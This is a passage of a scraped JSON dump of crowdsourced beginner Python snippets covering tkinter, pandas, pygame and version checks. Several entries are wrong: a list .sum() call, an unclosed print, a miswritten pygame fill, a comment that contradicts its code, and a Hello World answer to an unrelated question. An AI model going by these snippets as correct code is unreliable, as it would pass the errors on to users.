    "description": "a_date = datetime.date(2015, 10, 10) days = datetime.timedelta(5)  new_date = a_date - days #Subtract 5 days from a_date   print(new_date) #OUTPUT #2015-10-05\ndf_test['Difference'] = (df_test['First_Date'] - df_test['Second Date']).dt.days\n",
    "reg_date": "2021-10-12T11:29:59.000Z"
  },
  {
    "id": 1402,
    "keyword": null,
    "link": null,
    "title": " how to add button in tkinter",
    "description": "from tkinter import * window = Tk()  def got_clicked():   print(\"I got clicked!\")  my_button = Button(text=\"Click me\", command=got_clicked) my_button.pack()  window.mainloop()\nimport tkinter as tk       def write_slogan():     print(\"Tkinter is easy to use!\")  root = tk.Tk() frame = tk.Frame(root) frame.pack()  button = tk.Button(frame,                     text=\"QUIT\",                     fg=\"red\",                    command=quit) button.pack(side=tk.LEFT) slogan = tk.Button(frame,                    text=\"Hello\",                    command=write_slogan) slogan.pack(side=tk.LEFT)  root.mainloop() \nfrom tkinter import *  wow = Tk()  def ree(hi):   print(hi)    w = Button ( master=wow, command=ree('hi'), text=\"hi\" )  Output:   Tkinter:     ______    [  hi  ] <--- Button     ------      Shell:     hi <--- on button pressed\nfrom tkinter import *   master = Tk()  #program you want the button to execute def closewindow():     exit()  #set up button button = Button(master, text=\"close window\", command=closewindow)  button.pack()  mainloop() \nimport tkinter button1 = ttk.Button(self, text=\"anything\", command=random command)         button1.pack()\n",
    "reg_date": "2021-10-12T11:29:59.000Z"
  },
  {
    "id": 1403,
    "keyword": null,
    "link": null,
    "title": " how to add column headers in pandas",
    "description": "#suppose team is a df that has unnamed columns (0,1...) team.columns =['Name', 'Code', 'Age', 'Weight'] \n",
    "reg_date": "2021-10-12T11:29:59.000Z"
  },
  {
    "id": 1404,
    "keyword": null,
    "link": null,
    "title": " how to add headers in csv file using python",
    "description": "import csv  f = open(\"fruits.csv\", \"w\") writer = csv.DictWriter(     f, fieldnames=[\"fruit\", \"count\"]) writer.writeheader() f.close() Outputfruits.csvfruit,count \n",
    "reg_date": "2021-10-12T11:29:59.000Z"
  },
  {
    "id": 1405,
    "keyword": null,
    "link": null,
    "title": " how to add icon to tkinter window",
    "description": "root.iconbitmap('icon.ico')\n",
    "reg_date": "2021-10-12T11:29:59.000Z"
  },
  {
    "id": 1406,
    "keyword": null,
    "link": null,
    "title": " how to add images in hml while using flask",
    "description": "<image src=\"{{url_for('static',filename = 'images/download.jpg')}}\" > <!--filename  = \"path of your image in in static folder\"--> \n<img src=\"{{url_for('static', filename='MD.png')}}\">\n<image src=\"{{url_for('static',filename = 'images/download.jpg')}}\" >\n",
    "reg_date": "2021-10-12T11:29:59.000Z"
  },
  {
    "id": 1407,
    "keyword": null,
    "link": null,
    "title": " how to add input box in tkinter",
    "description": "from tkinter import *  window = Tk() # entry box my_input = Entry() my_input.pack()  window.mainloop()\nimport tkinter as tk  def show_entry_fields():     print(\"First Name: %s\\nLast Name: %s\" % (e1.get(), e2.get()))     e1.delete(0, tk.END)     e2.delete(0, tk.END)  master = tk.Tk() tk.Label(master, text=\"First Name\").grid(row=0) tk.Label(master, text=\"Last Name\").grid(row=1)  e1 = tk.Entry(master) e2 = tk.Entry(master) e1.insert(10, \"Miller\") e2.insert(10, \"Jill\")  e1.grid(row=0, column=1) e2.grid(row=1, column=1)  tk.Button(master,            text='Quit',            command=master.quit).grid(row=3,                                      column=0,                                      sticky=tk.W,                                      pady=4) tk.Button(master, text='Show', command=show_entry_fields).grid(row=3,                                                                 column=1,                                                                 sticky=tk.W,                                                                 pady=4)  master.mainloop()  tk.mainloop() \nimport tkinter as tk  root= tk.Tk()  canvas1 = tk.Canvas(root, width = 400, height = 300,  relief = 'raised') canvas1.pack()  label1 = tk.Label(root, text='Calculate the Square Root') label1.config(font=('helvetica', 14)) canvas1.create_window(200, 25, window=label1)  label2 = tk.Label(root, text='Type your Number:') label2.config(font=('helvetica', 10)) canvas1.create_window(200, 100, window=label2)  entry1 = tk.Entry (root)  canvas1.create_window(200, 140, window=entry1)  def getSquareRoot ():          x1 = entry1.get()          label3 = tk.Label(root, text= 'The Square Root of ' + x1 + ' is:',font=('helvetica', 10))     canvas1.create_window(200, 210, window=label3)          label4 = tk.Label(root, text= float(x1)**0.5,font=('helvetica', 10, 'bold'))     canvas1.create_window(200, 230, window=label4)      button1 = tk.Button(text='Get the Square Root', command=getSquareRoot, bg='brown', fg='white', font=('helvetica', 9, 'bold')) canvas1.create_window(200, 180, window=button1)  root.mainloop()\n#ent is the name of the Entry s = ent.get()\n",
    "reg_date": "2021-10-12T11:29:59.000Z"
  },
  {
    "id": 1408,
    "keyword": null,
    "link": null,
    "title": " how to add int to tuple python",
    "description": "t = ('add','to','the') t += ('tuple',) #('add','to','the','tuple')\na = (1, 2, 3) b = a + (4, 5, 6)  # (1, 2, 3, 4, 5, 6) c = b[1:]  # (2, 3, 4, 5, 6)\n",
    "reg_date": "2021-10-12T11:30:00.000Z"
  },
  {
    "id": 1409,
    "keyword": null,
    "link": null,
    "title": " how to add legend to python plot",
    "description": "import numpy as np import matplotlib.pyplot as plt  x = np.linspace(0, 20, 1000) y1 = np.sin(x) y2 = np.cos(x)  plt.plot(x, y1, \"-b\", label=\"sine\") plt.plot(x, y2, \"-r\", label=\"cosine\") plt.legend(loc=\"upper left\") plt.ylim(-1.5, 2.0) plt.show() \nplt.legend(['first', 'second']);\n",
    "reg_date": "2021-10-12T11:30:00.000Z"
  },
  {
    "id": 1410,
    "keyword": null,
    "link": null,
    "title": " how to add modules in python",
    "description": "# how to use any module in python # first instal what module you want to use in vscode # my time is alredy installed there for we get an error # moving to next is how to use import time for i in range (3):     print(\"Whait wor 3 sec...\")     time.sleep(3)          print(i + 1) # every module are used in their own manner # you can search like python (module) package # eg = python time package # and you will khow how to use it # as you have seen that it weight for 3 second # thank you for wathing  # good bye # have a nice day # Do your programsin vscode it would be more easy\n",
    "reg_date": "2021-10-12T11:30:00.000Z"
  },
  {
    "id": 1411,
    "keyword": null,
    "link": null,
    "title": " how to add numbers in python using for loop",
    "description": "n = input(\"Enter Number to calculate sum\") n = int (n) sum = 0 for num in range(0, n+1, 1):     sum = sum+num print(\"SUM of first \", n, \"numbers is: \", sum )\n",
    "reg_date": "2021-10-12T11:30:00.000Z"
  },
  {
    "id": 1412,
    "keyword": null,
    "link": null,
    "title": " how to add row in spark dataframe",
    "description": "# Create hard coded row unknown_list = [[&lsquo;0&rsquo;, &lsquo;Unknown&rsquo;]] # turn row into dataframe unknown_df = spark.createDataFrame(unknown_list) # union with existing dataframe df = df.union(unknown_df)\n",
    "reg_date": "2021-10-12T11:30:00.000Z"
  },
  {
    "id": 1413,
    "keyword": null,
    "link": null,
    "title": " how to add special token to bert tokenizer",
    "description": "special_tokens_dict = {'additional_special_tokens': ['[C1]','[C2]','[C3]','[C4]']} num_added_toks = tokenizer.add_special_tokens(special_tokens_dict) model.resize_token_embeddings(len(tokenizer))\n",
    "reg_date": "2021-10-12T11:30:00.000Z"
  },
  {
    "id": 1414,
    "keyword": null,
    "link": null,
    "title": " how to add start time and end time in python tkinter",
    "description": "import datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \n",
    "reg_date": "2021-10-12T11:30:00.000Z"
  },
  {
    "id": 1415,
    "keyword": null,
    "link": null,
    "title": " how to add text in python turtle",
    "description": "import turtle  turtle.color(' black') style = ('Arial', 30, 'italic') turtle.write('Hello!', font=style, align='center') turtle.hideturtle() \n",
    "reg_date": "2021-10-12T11:30:00.000Z"
  },
  {
    "id": 1416,
    "keyword": null,
    "link": null,
    "title": " how to add the column to the beginning of dataframe",
    "description": "# Third position would be at index 2, because of zero-indexing. df.insert(2, 'new-col', data) \n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1417,
    "keyword": null,
    "link": null,
    "title": " how to add up a list in python",
    "description": "liste = [1,2,3,4] tot = 0 for i in liste:   tot = i + tot print(tot)\nmyList = [1, 2, 3]  myList.append(4)\na_list = [1,2,3] a_list.append(4)\n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1418,
    "keyword": null,
    "link": null,
    "title": " how to add up everything in a list python",
    "description": "num = [1,2,3,4]  print(num.sum()) #We use the .sum() function for the adding of everything\n>>> list = [1, 2, 3] >>> sum(list) 6\n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1419,
    "keyword": null,
    "link": null,
    "title": " how to add value in front of array pythojn",
    "description": "x = [3, 56, 34, 67] x.insert(0, 45) print(x)  #[43, 3, 56, 34, 67]\n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1420,
    "keyword": null,
    "link": null,
    "title": " how to add value to to interger in python",
    "description": "a = 50 #a is 50\n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1421,
    "keyword": null,
    "link": null,
    "title": " how to add variable in list python",
    "description": "Num = 19 listNum = [16 , 17 , 18] listNum.append(Num) print(listNum)\n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1422,
    "keyword": null,
    "link": null,
    "title": " how to add variables and text in python on same line",
    "description": "a, b, c = \"spoon\", \"plate\", \"glass\" print(a)#seperate line print(b)#seperate line print(c)#seperate line print(a,\", \" +b, \", and \" + c + \" said hello\")#same line \nprint(\"If there was a birth every 7 seconds, there would be: \", births, \"births\") \nx = input(\"Enter the first number: \") y = input(\"Enter the second number: \") z = int(x)+int(y) #Just use a comma print(\"The sum of the numbers you entered =\",z)\nprint(\"If there was a birth every 7 seconds, there would be: {} births\".format(births)) \n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1423,
    "keyword": null,
    "link": null,
    "title": " how to align text in tkinter",
    "description": "Label(root, text='Pack', anchor='w').pack(fill='both') # anchor='w' ---- w  for left # anchor='e' ---- e  for right # anchor='center' ---- center  for center\n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1424,
    "keyword": null,
    "link": null,
    "title": " how to append element python",
    "description": "example_array = [] example_array.append('element here')\n",
    "reg_date": "2021-10-12T11:30:01.000Z"
  },
  {
    "id": 1425,
    "keyword": null,
    "link": null,
    "title": " how to append to text file with new line by line in python",
    "description": "with open('file_name.txt', 'a') as f:         f.write(file + '\\n')\n# Open a file with access mode 'a' file_object = open('sample.txt', 'a')   # Append 'hello' at the end of file file_object.write('hello')   # Close the file file_object.close() \n",
    "reg_date": "2021-10-12T11:30:02.000Z"
  },
  {
    "id": 1426,
    "keyword": null,
    "link": null,
    "title": " how to ask manager if he wants any changes in the given task",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:30:02.000Z"
  },
  {
    "id": 1427,
    "keyword": null,
    "link": null,
    "title": " how to ask python function to return something",
    "description": "def python_sum(num1, num2):   return num1+num2 print(python_sum(70,10)\n",
    "reg_date": "2021-10-12T11:30:02.000Z"
  },
  {
    "id": 1428,
    "keyword": null,
    "link": null,
    "title": " how to ask someone for their name in python",
    "description": "name=input(\"what is your name\")\n",
    "reg_date": "2021-10-12T11:30:02.000Z"
  },
  {
    "id": 1429,
    "keyword": null,
    "link": null,
    "title": " how to autosave in python",
    "description": "file = open(\"YOUR TEXT FILE.txt\", \"w\") #w for clear all txt and type and a for append file.write(\"hi\" + \\n) #\\n for newlie optional file.close() #to close file  #Discord: Fighter x Yt#6699 ( dm for questions )\n",
    "reg_date": "2021-10-12T11:30:02.000Z"
  },
  {
    "id": 1430,
    "keyword": null,
    "link": null,
    "title": " how to average in python with loop",
    "description": "list = input('Input a list of numbers separated by comma then space:\\n ') try:     list = list.split(', ')     sum = 0          for number in list:         sum = int(number) + sum      avg = sum / len(list)     print('The average of the numbers you entered is: ', avg) except ValueError:     print('Please enter a list of number separated by a comma and space only')\n",
    "reg_date": "2021-10-12T11:30:02.000Z"
  },
  {
    "id": 1431,
    "keyword": null,
    "link": null,
    "title": " how to backspace in python",
    "description": "#x will be deleted print(\"x\\b\")\n",
    "reg_date": "2021-10-12T11:30:02.000Z"
  },
  {
    "id": 1432,
    "keyword": null,
    "link": null,
    "title": " how to bind enter key in tkinter",
    "description": "entry.bind('<Return>', func)\n pythonCopyimport tkinter as tk  app = tk.Tk() app.geometry(\"200x100\")  def callback(event):     label[\"text\"] = \"You pressed Enter\"  app.bind('<Return>', callback)  label = tk.Label(app, text=\"\") label.pack()  app.mainloop()\n",
    "reg_date": "2021-10-12T11:30:02.000Z"
  },
  {
    "id": 1433,
    "keyword": null,
    "link": null,
    "title": " how to calculate average in list python by using whil loop",
    "description": "def avg(list):     s = 0     total = 0.0     while(s < len(list)):         total = total + list[s]         s = s+1     return total/len(list) ans = avg([1, 2, 3, 4, 5]) print(ans)\n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1434,
    "keyword": null,
    "link": null,
    "title": " how to calculate rmse in linear regression python",
    "description": "actual = [0, 1, 2, 0, 3] predicted = [0.1, 1.3, 2.1, 0.5, 3.1]  mse = sklearn.metrics.mean_squared_error(actual, predicted)  rmse = math.sqrt(mse)  print(rmse)\n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1435,
    "keyword": null,
    "link": null,
    "title": " how to call super class constructor in python two classes",
    "description": "from Employee import Employee from Person import Person  class Manager(Person, Employee):      def __init__(self,lname, fname, phone_number, addy, start_date, salary, department, direct_reports):         Employee.__init__(self,start_date,salary)         Person.__init__(self,lname,fname,phone_number, addy)         self.department = department         self.direct_reports = direct_reports\n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1436,
    "keyword": null,
    "link": null,
    "title": " how to capture a single photo with webcam opencv",
    "description": "cam = cv2.VideoCapture(0)  image = cam.read()[1]  cv2.imshow(\"image\", image)  cv2.waitKey(0) cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1437,
    "keyword": null,
    "link": null,
    "title": " how to capture an image with web cam open cv",
    "description": "cam = cv2.VideoCapture(0)  image = cam.read()[1]  cv2.imshow(\"image\", image)  cv2.waitKey(0) cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1438,
    "keyword": null,
    "link": null,
    "title": " how to center plotly plot title",
    "description": "import plotly.graph_objects as go  fig = go.Figure()  fig.update_layout(     title=\"Plot Title\",     xaxis_title=\"x Axis Title\",     yaxis_title=\"y Axis Title\",     font=dict(         family=\"Courier New, monospace\",         size=18,         color=\"#7f7f7f\"     ) )  fig.show()\nfig.update_layout(title_text='Your title', title_x=0.5)\n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1439,
    "keyword": null,
    "link": null,
    "title": " how to change button background color while clicked tkinter python",
    "description": "#Type \"activebackground=\" + your chosen background color between commas col = Button(yourWindow, text='col', bg='gray25', activebackground='cyan')\n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1440,
    "keyword": null,
    "link": null,
    "title": " how to change cursor on hover of button in tkinter",
    "description": "tkinter.Text(tk.Tk(), insertbackground=\"#3C3F41\")\nimport tkinter as tk  root = tk.Tk()  # cursor=\"hand1\" or cursor=\"hand2\" tk.Button(root, text=\"Start\", cursor=\"hand2\")  root.mainloop()  \n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1441,
    "keyword": null,
    "link": null,
    "title": " how to change font in tkinter",
    "description": "#How to change the font of a label in Tkinter  #Import  from tkinter import *  #Screen window = Tk() window.title(\"New Window\") window.geometry(\"300x250\")  Label(window, text = \"This is my new project in python!\", font = (\"Bahnschrift\", 14)).pack() #------------------------------------------------------------------------------------------- #'font' tells python that we are going to do something with the font #------------------------------------------------------------------------------------------- #'()' are needed becuase that is just how python works #------------------------------------------------------------------------------------------- #'\"___\"' put your font name in the quotes #------------------------------------------------------------------------------------------- #10 put vyour fontsize after adding a comma after the font name #-------------------------------------------------------------------------------------------\nimport tkinter.font as font  #create Font object myFont = font.Font(family='Helvetica')  button = Button(parent, font=myFont) #or button = Button(parent) button['font'] = myFont\nimport tkinter.font as TkFont  font = tkFont.Font ( option, ... ) # Exaple helv36 = tkFont.Font(family=\"Helvetica\",size=36,weight=\"bold\")\n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1442,
    "keyword": null,
    "link": null,
    "title": " how to change font sizetkniter",
    "description": "label.config(font=(\"Courier\", 44)) \n",
    "reg_date": "2021-10-12T11:30:03.000Z"
  },
  {
    "id": 1443,
    "keyword": null,
    "link": null,
    "title": " how to change help command on discord python",
    "description": "client = commands.Bot(command_prefix = '~', help_command=None)  @client.command() async def help(ctx):     await context.send('`Whatever`')\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1444,
    "keyword": null,
    "link": null,
    "title": " how to change icon in pygame",
    "description": "gameIcon = pygame.image.load('carIcon.png') pygame.display.set_icon(gameIcon)\npygame.display.set_icon(pygame.image.load('icon.png'))\nprogramIcon = pygame.image.load(\"icon.png\")  pygame.display.set_icon(programIcon) \nimport pygame  win = pygame.display.set_mode((500, 500)) pygame.display.set_caption('Hello World') icon = pygame.image.load(\"<< <<image_Nmae>>.<<extension>> >>\") pygame.display.set_icon(icon)\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1445,
    "keyword": null,
    "link": null,
    "title": " how to change number of steps in tensorflow object detection api",
    "description": "python model_main_tf2.py --pipeline_config_path=training/ssd_efficientdet_d0_512x512_coco17_tpu-8.config --num_train_steps=5000 --model_dir=training --alsologtostderr\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1446,
    "keyword": null,
    "link": null,
    "title": " how to change opencv capture resolution",
    "description": "cap.set(cv2.CAP_PROP_FRAME_WIDTH,640); cap.set(cv2.CAP_PROP_FRAME_HEIGHT,480);\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1447,
    "keyword": null,
    "link": null,
    "title": " how to change pygame window icon",
    "description": "icon = pygame.image.load('icon.png') pygame.display.set_icon(icon)\npygame.display.set_icon(pygame.image.load('icon.png'))\nimport pygame  win = pygame.display.set_mode((500, 500)) pygame.display.set_caption('Hello World') icon = pygame.image.load(\"<< <<image_Nmae>>.<<extension>> >>\") pygame.display.set_icon(icon)\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1448,
    "keyword": null,
    "link": null,
    "title": " how to change python version on linux",
    "description": "#Check available versions ls /usr/bin/python* #Change the used version 3.5 or 3.7 etc alias python='/usr/bin/python3.x' #do this other thing . ~/.bashrc #Check version  python --version\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1449,
    "keyword": null,
    "link": null,
    "title": " how to change size of xticks",
    "description": "plt.xticks(fontsize=14, rotation=90)\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1450,
    "keyword": null,
    "link": null,
    "title": " how to change the color of the cursor in tkinter",
    "description": "tkinter.Text(tk.Tk(), insertbackground=\"#3C3F41\")\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1451,
    "keyword": null,
    "link": null,
    "title": " how to change the column order in pandas dataframe",
    "description": "df = df.reindex(columns=column_names)\n# setting up a dummy dataframe raw_data = {'name': ['Willard Morris', 'Al Jennings', 'Omar Mullins', 'Spencer McDaniel'],         'age': [20, 19, 22, 21],         'favorite_color': ['blue', 'red', 'yellow', \"green\"],         'grade': [88, 92, 95, 70]} df = pd.DataFrame(raw_data, index = ['Willard Morris', 'Al Jennings', 'Omar Mullins', 'Spencer McDaniel']) df  #now 'age' will appear at the end of our df df = df[['favorite_color','grade','name','age']] df.head()\ncols = df.columns.tolist() # Rearrange the list any way you want cols = cols[-1:] + cols[:-1] df = df[cols]\n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1452,
    "keyword": null,
    "link": null,
    "title": " how to change the console background color in python",
    "description": "import os  os.system('color 8f') \n",
    "reg_date": "2021-10-12T11:30:04.000Z"
  },
  {
    "id": 1453,
    "keyword": null,
    "link": null,
    "title": " how to change the font of a label in tkinter",
    "description": "#How to change the font of a label in Tkinter  #Import  from tkinter import *  #Screen window = Tk() window.title(\"New Window\") window.geometry(\"300x250\")  Label(window, text = \"This is my new project in python!\", font = (\"Bahnschrift\", 14)).pack() #------------------------------------------------------------------------------------------- #'font' tells python that we are going to do something with the font #------------------------------------------------------------------------------------------- #'()' are needed becuase that is just how python works #------------------------------------------------------------------------------------------- #'\"___\"' put your font name in the quotes #------------------------------------------------------------------------------------------- #10 put vyour fontsize after adding a comma after the font name #-------------------------------------------------------------------------------------------\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1454,
    "keyword": null,
    "link": null,
    "title": " how to change the rate of speech in pyttsx3",
    "description": "import pyttsx3  engine = pyttsx3.init() engine.setProperty(\"rate\", 178) engine.say(\"I am the text spoken after changing the speech rate.\") engine.runAndWait()\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1455,
    "keyword": null,
    "link": null,
    "title": " how to change the scale of a picture in pygame",
    "description": "import pygame picture = pygame.image.load(filename) picture = pygame.transform.scale(picture, (1280, 720)) \n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1456,
    "keyword": null,
    "link": null,
    "title": " how to change the window colour in pygame",
    "description": "import pygame pygame.init() #initialize pygame SCREEN_WIDTH = 600 # width (in px) SCREEN_HEIGHT = 800 # height (in px)  WIN = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT)) # creates a screen of 600px X 800px RED_VALUE = 255 # should be from 0 - 255 GREEN_VALUE = 255 # should be from 0 - 255 BLUE_VALUE = 255 # should be from 0 - 255 while True: \tpygame.display.update() # updates the screen     WIN.fill(RED_VALUE,GREEN_VALUE,BLUE_VALUE) # this is going to be white in color\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1457,
    "keyword": null,
    "link": null,
    "title": " how to change turtle shape in python",
    "description": "import turtle t = turtle.Turtle() t.color(color) # choose a color t.begin_fill() # if you want it to be filled with color later t.circle(10) # the function \"circle\" and the radious. t.end_fill() # completing the filling of the circle.  # try to do it and see if it works. it worked for me.\nimport turtle as turtle turtle.shape(\"arrow\")#can be many shapes\n >>> tp = turtle.pos()  >>> tp  (0.00,0.00)  >>> turtle.setpos(60,30)  >>> turtle.pos()  (60.00,30.00)  >>> turtle.setpos((20,80))  >>> turtle.pos()  (20.00,80.00)  >>> turtle.setpos(tp)  >>> turtle.pos()  (0.00,0.00) \n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1458,
    "keyword": null,
    "link": null,
    "title": " how to change window size in kivy python",
    "description": "#import everything you want from kivy.core.window import Window #You must import this Window.size = (600, 600) #Set it to a tuple with the (width, height) in Pixels #(800, 600) is the default   #Your usual kivy code....\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1459,
    "keyword": null,
    "link": null,
    "title": " how to change windows icon tkinter",
    "description": "from tkinter import *  root = Tk() photo = PhotoImage(file = \"image.png\") root.iconphoto(False, photo)\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1460,
    "keyword": null,
    "link": null,
    "title": " how to check current version of tensorflow",
    "description": "import tensorflow as tf tf.__version__\npython -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 2 python3 -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 3\nprint(tf.__version__)\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1461,
    "keyword": null,
    "link": null,
    "title": " how to check datatype of column in dataframe python",
    "description": "df['DataFrame Column'].dtypes \ndf.dtypes\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1462,
    "keyword": null,
    "link": null,
    "title": " how to check if a letter is lowercase in python",
    "description": "for c in s:     if c.islower():          print c\nstring = \"python\" string.islower() #returns true or false  #or we can use this  string == string.lower() #returns true or false\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1463,
    "keyword": null,
    "link": null,
    "title": " how to check if a message includes a word discord.py",
    "description": "@bot.event async def on_message(msg):     if 'word' in msg.content:         print('Keyword found')         # Do stuff here\n",
    "reg_date": "2021-10-12T11:30:05.000Z"
  },
  {
    "id": 1464,
    "keyword": null,
    "link": null,
    "title": " how to check if a number is odd python",
    "description": "# Python program to check if the input number is odd or even. # A number is even if division by 2 gives a remainder of 0. # If the remainder is 1, it is an odd number.  num = int(input(\"Enter a number: \")) if (num % 2) == 0:    print(\"{0} is Even\".format(num)) else:    print(\"{0} is Odd\".format(num))\nm = int(input(\"Enter number\")) if m % 2 == 0:     print(m,\"is an even number\") else:     print(m,\"is an odd number\")      \nnum = int(input(\"Enter a number: \"))   if (num % 2) == 0:      print(\"{0} is Even number\".format(num))   else:      print(\"{0} is Odd number\".format(num))  \nnum = int(input(\"Enter a number: \")) if (num % 2) == 0:    print(\"{0} is Even\".format(num)) else:    print(\"{0} is Odd\".format(num))      \n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1465,
    "keyword": null,
    "link": null,
    "title": " how to check if an application is open in python",
    "description": "#Iterates through all the programs running in your system and checks for the one in the string import psutil     \"someProgram\" in (p.name() for p in psutil.process_iter())\n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1466,
    "keyword": null,
    "link": null,
    "title": " how to check if an element is visible on the web page in selenium python",
    "description": "driver.findElement(By.cssSelector(\"a > font\")).isDisplayed()\n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1467,
    "keyword": null,
    "link": null,
    "title": " how to check if datapoint is in pandas column",
    "description": "# to mark NaN column as True df['your column name'].isnull() \n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1468,
    "keyword": null,
    "link": null,
    "title": " how to check if how much time is your code taking to run in python",
    "description": "def program_time_checker():     start_time = time.time()     print(\"Grepper\")     num = 90     print(num)     end_time = time.time()     return end_time-start_time #call the function to get the time taken by your program to run print(program_time_checker())\n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1469,
    "keyword": null,
    "link": null,
    "title": " how to check if its later than python",
    "description": "datetime.datetime.now().hour == 8\n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1470,
    "keyword": null,
    "link": null,
    "title": " how to check if y axis is inverted matplotlib",
    "description": "import matplotlib.pyplot as plt  # ('gca' stands for get current axes)  # To check whether the y axis is inverted: plt.gca().yaxis_inverted()  # To check whether the x axis is inverted: plt.gca().xaxis_inverted()  \"\"\"  Both functions return True if their axes are inverted. - The y axis is inverted if the values are increasing downwards. - The x axis is inverted if the values are increasing leftwards.  \"\"\"  # To flip the y axis: plt.gca().invert_yaxis()  #To flip the x axis: plt.gca().invert_xaxis()  \"\"\"  When plotting the equation 'y=-x' the y axis tends to flip for some reason, so to overcome this and keep the y axis non-inverted you can check whether the axis is inverted and if True re-flip it the right way round:  \"\"\"  if plt.gca().yaxis_inverted():     plt.gca().invert_yaxis() \n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1471,
    "keyword": null,
    "link": null,
    "title": " how to check in which directory python in running",
    "description": "import os cwd = os.getcwd()\nimport os  #Get Current working Directory currentDirectory = os.getcwd()  #Change the Current working Directory os.chdir('/home/varun') \n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1472,
    "keyword": null,
    "link": null,
    "title": " how to check opencv version using python",
    "description": "$ python # \"python3\"- if you are using another version of python >>>import cv2 >>>cv2.__version__\n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1473,
    "keyword": null,
    "link": null,
    "title": " how to check python version",
    "description": "# To check your Python version in the command line use: python --version  # To check your Python verson inside a script use: import sys print(sys.version)\n# in python $ python --version  # in python3 $ python3 --version\npython --version\n# 2 ways to check python version # In the terminal/cmd write the following:  # Way 1 python -V  # Way 2 python -c \"import sys; print(sys.version)\"\npython &ndash;&ndash;version\npython --version #in command line  python #or by enterng interactiv mode\n",
    "reg_date": "2021-10-12T11:30:06.000Z"
  },
  {
    "id": 1474,
    "keyword": null,
    "link": null,
    "title": " how to check python version linux",
    "description": "python3 --version\npython --version\nimport platform  print(platform.python_version())\n$ python2 --version\n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1475,
    "keyword": null,
    "link": null,
    "title": " how to check python version on terminal",
    "description": "# To check your Python version in the command line use: python --version  # To check your Python verson inside a script use: import sys print(sys.version)\n# in python $ python --version  # in python3 $ python3 --version\npython3 --version\t# This is to check the python 3 version on mac terminal\npython --version #in command line  python #or by enterng interactiv mode\n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1476,
    "keyword": null,
    "link": null,
    "title": " how to check the type of a variable in python",
    "description": "v = 10 type(v) # <type 'int'>\nprint(type(x))\n>>> i = 123 >>> type(i) <type 'int'> >>> type(i) is int True >>> i = 123.456 >>> type(i) <type 'float'> >>> type(i) is float True \nstr = \"Hello\" type(str)\n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1477,
    "keyword": null,
    "link": null,
    "title": " how to check version of pip in anaconda",
    "description": "pip --version\n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1478,
    "keyword": null,
    "link": null,
    "title": " how to check weather my model is on gpu in pytorch",
    "description": "next(network.parameters()).device \n",
    "reg_date": "2021-10-12T11:30:07.000Z"
  },
  {
    "id": 1479,
    "keyword": null,
    "link": null,
